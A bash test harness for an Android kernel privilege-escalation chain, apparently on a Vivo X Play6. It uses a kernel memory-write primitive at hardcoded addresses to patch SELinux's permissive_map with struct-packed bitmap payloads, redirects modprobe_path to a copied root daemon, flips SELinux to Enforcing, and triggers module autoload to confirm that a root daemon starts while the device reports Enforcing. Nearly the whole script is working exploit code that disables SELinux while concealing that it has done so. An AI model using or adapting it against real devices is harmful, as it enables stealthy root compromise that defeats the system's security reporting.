#!/usr/bin/env bash
# Does a daemon still START from cold conditions while SELinux reports Enforcing?
# permissive_test.sh only proved ops work for an already-running daemon; the exec of
# modprobe_path happens in the kernel domain, so that gap was untested (ledger 131b).
#
# Sequence: patch permissive_map (bitmap from TYPES) -> drain avc -> enforce=1 ->
# point modprobe_path at a fresh copy of the daemon -> kill the RUNNING daemon (we are
# its child; our own fd survives, its listening sockets close) -> trigger autoload ->
# ask the NEW daemon to identify itself. The answer comes back over a fresh TCP accept,
# so a reply is proof the new daemon exec'd and bound ports under Enforcing.
#
# usage: bootstrap_test.sh [serial]        (TYPES comes from env, default = all types)
set -u
SER=${1:-3e5a38a5}
T="$(cd "$(dirname "$0")" && pwd)"
ADB="adb -s $SER"
D=/data/local/tmp
TYPES=${TYPES:-ALL}
$ADB get-state >/dev/null 2>&1 || { echo "ABORT: $SER not on adb"; exit 2; }
E=$($ADB shell getenforce 2>/dev/null | tr -d '\r')
[ "$E" = "Permissive" ] || { echo "start from Permissive (am startservice com.xplay6.temproot/.EscService); got $E"; exit 2; }
$ADB forward tcp:12345 tcp:12345 >/dev/null 2>&1

run() { { printf '%s\n' "$1"; sleep "$2"; } | timeout $((40 + $2)) bash -c \
	'exec 3<>/dev/tcp/127.0.0.1/12345; cat >&3; cat <&3' 2>/dev/null | tr -d '\r'; }

# build the payload hex the same way permissive_test.sh does (struct.pack + assertions)
eval "$(NODE_BASE=0xffffffc001635a78 HEAD_ADDR=0xffffffc00189f4d0 TYPE=241 \
	BITMODE=$([ "$TYPES" = ALL ] && echo all || echo one) python3 - <<'PY'
import os, struct
base=int(os.environ["NODE_BASE"],16); head=int(os.environ["HEAD_ADDR"],16)
bit=int(os.environ["TYPE"]); allb=os.environ["BITMODE"]=="all"
def node(nnext, sbit, full):
    maps=[0xFFFFFFFFFFFFFFFF]*6 if full else [0]*6
    if not full:
        maps[(bit-sbit)//64] |= 1 << ((bit-sbit)%64)
    b=struct.pack("<Q", nnext)+b"".join(struct.pack("<Q",m) for m in maps)+struct.pack("<I",sbit)
    return b+b"\0"*4
if allb:
    # modprobe_path's tail (bytes 64..255) holds exactly three 64-byte nodes => bits 1..1151.
    # Coverage is not assumed: the caller re-checks that ZERO permissive=0 denials appear
    # while enforcing, which is what proves every domain involved was really exempted.
    payload=node(base+64,0,True)+node(base+128,384,True)+node(0,768,True)
    high=0x7FFFFFFF
    assert len(payload)==192
else:
    payload=node(0,(bit//64)*64,False)
    high=bit; hb=bit
assert len(payload) in (64,192), len(payload)
print("NODE_HEX="+payload.hex())
print("NODE_BYTES=%d"%len(payload))
headb=struct.pack("<Q",base)+struct.pack("<II",high,0)
assert len(headb)==16, len(headb)
print("HEAD_BYTES=%d"%len(headb))
print("HEAD_HEX="+headb.hex())
PY
)"
for v in NODE_HEX HEAD_HEX; do
	[ -n "\${!v:-}" ] || { echo "ABORT: \$v was not generated - refusing to run a half-patched test"; exit 2; }
done
echo "bitmap mode: $TYPES  node bytes=$NODE_BYTES  head bytes=$(expr length \"$HEAD_HEX\")"

echo "=== 0b. pre-flight: the channel must answer before anything else is trusted"
if ! run 'echo PRE-OK' 6 | grep -q PRE-OK; then
	echo "  ABORT: daemon channel silent before we touched anything -- this run would prove nothing"
	exit 3
fi
echo "  channel live"

echo "=== 1. patch permissive_map, drain avc, point modprobe_path at a fresh copy"
# Split into separate round-trips with honest waits: this used to be ONE line with a
# 40 s sleep while the 300-op purge alone takes ~90 s, so the tail (including the flip)
# never ran and the test measured a permissive system while printing "PASS".
run "cp $D/sudA $D/sudB; chmod 755 $D/sudB; chcon u:object_r:shell_data_file:s0 $D/sudB; /data/local/tmp/clobber 14 kern 0xffffffc001635a78 hex:$NODE_HEX | grep -c 'PRIMITIVE WORKS'; /data/local/tmp/clobber 14 kern 0xffffffc00189f4d0 hex:$HEAD_HEX | grep -c 'PRIMITIVE WORKS'" 30 | tr '\n' ' '; echo
run "echo 0 > /sys/fs/selinux/avc/cache_threshold; N=0; for TY in \$(cat $D/typelist.txt); do chcon u:object_r:\$TY:s0 $D/nd/f 2>/dev/null && stat $D/nd/f >/dev/null 2>&1 && N=\$((N+1)); done; echo PURGED=\$N" 150 | grep PURGED
run "/data/local/tmp/clobber 14 kern 0xffffffc001635a30 str:$D/sudB 4 0 | grep -c 'PRIMITIVE WORKS'; cat /proc/sys/kernel/modprobe; echo 1 > /sys/fs/selinux/enforce; echo FLIPPED $(getenforce)" 25 | tail -3

echo "=== 2. device-side state check from outside (no root needed)"
$ADB shell 'getenforce' 2>&1 | tr -d '\r' | sed 's/^/  getenforce: /'

echo "=== 3. kill the running daemon, trigger autoload, ask the NEW one who it is"
# Evidence must be captured BEFORE the kill: after kill -9 $PPID the only channel that
# could read dmesg is gone, so a "no denials" print would be a silence, not a result.
run 'dmesg > /data/local/tmp/dmesg.pre 2>/dev/null; chmod 666 /data/local/tmp/dmesg.pre; echo SNAP' 10 | grep -c SNAP
# the trigger comes from adb shell: our own sh inherited the accepted-connection fd, and
# a daemon we could not start must not be excused by "port busy because of my own fds"
run 'kill -9 $PPID; echo KILLED' 6 | grep -c KILLED >/dev/null
sleep 2
timeout 30 $ADB shell "test -x $D/sudB && $D/mpp >/dev/null 2>&1; echo TRIG" 2>&1 | tr -d '\r' | tail -1
sleep 8
ANS=$(run 'echo HELLO-FROM-NEW; id -Z; getenforce' 8 || true)
echo "$ANS" | sed -n '1,5p'
# The verdict needs BOTH halves: a reply, and the mode the reply itself reported.
# A reply while getenforce says Permissive proves nothing (that was the earlier false green).
case "$ANS" in
  *qti_init_shell*Enforcing*|*uid=0*Enforcing*) echo "  ==> PASS: kmod-started daemon answered while IT SAW Enforcing";;
  *qti_init_shell*|*uid=0*) echo "  ==> VOID: daemon answered but state was Permissive => flip did not happen; fix step 1";;
  *) echo "  ==> no answer under enforcing (see denials below)";;
esac

echo "=== 4. who listens now, and what was denied while enforcing"
$ADB shell 'getenforce; netstat -ltn 2>/dev/null | grep -cE ":1234[56]"; ps -Z 2>/dev/null | grep -c sud' 2>&1 | tr -d '\r' | sed 's/^/  /'
$ADB shell 'grep -c "permissive=0" /data/local/tmp/dmesg.pre 2>/dev/null' 2>&1 | tr -d '\r' | sed 's/^/  denials snapshotted pre-kill: /'
$ADB shell 'dmesg 2>/dev/null | grep "permissive=0" | tail -4 | cut -c1-125' 2>&1 | tr -d '\r' | sed 's/^/  /'
echo "=== 5. restore"
timeout 30 $ADB shell am startservice -n com.xplay6.temproot/.EscService >/dev/null 2>&1
i=0; while [ $i -lt 24 ]; do sleep 5; i=$((i+1)); G=$($ADB shell getenforce 2>/dev/null | tr -d '\r'); [ "$G" = Permissive ] && break; done; echo "  after restore: $G (waited $((i*5))s)"
